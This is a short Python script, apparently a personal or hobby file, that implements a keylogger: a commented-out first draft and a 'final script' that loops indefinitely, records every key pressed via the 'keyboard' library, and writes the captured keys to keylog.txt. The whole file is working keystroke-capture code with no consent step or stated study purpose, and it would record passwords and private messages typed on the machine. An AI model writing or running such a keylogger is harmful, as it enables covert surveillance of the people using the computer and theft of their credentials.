# import keyboard

# keyboard.is_pressed('esc')
# def on_key_event(event):
#     with open("keylog.txt", "a") as log_file:
#         log_file.write(f"{event.name}\n")
# keyboard.on_press(on_key_event)
# keyboard.wait('esc')  # Wait until 'esc' key is pressed to stop the program
# print("Keylogger stopped.")
# # This keylogger captures keystrokes and writes them to a file named "keylog.txt".



# final script


import keyboard
key_list = []
while True:
    event = keyboard.read_event()
    if event.event_type == keyboard.KEY_DOWN:
        
        key_list.append(event.name)
        with open("keylog.txt", "w") as f:
            f.write(str(key_list))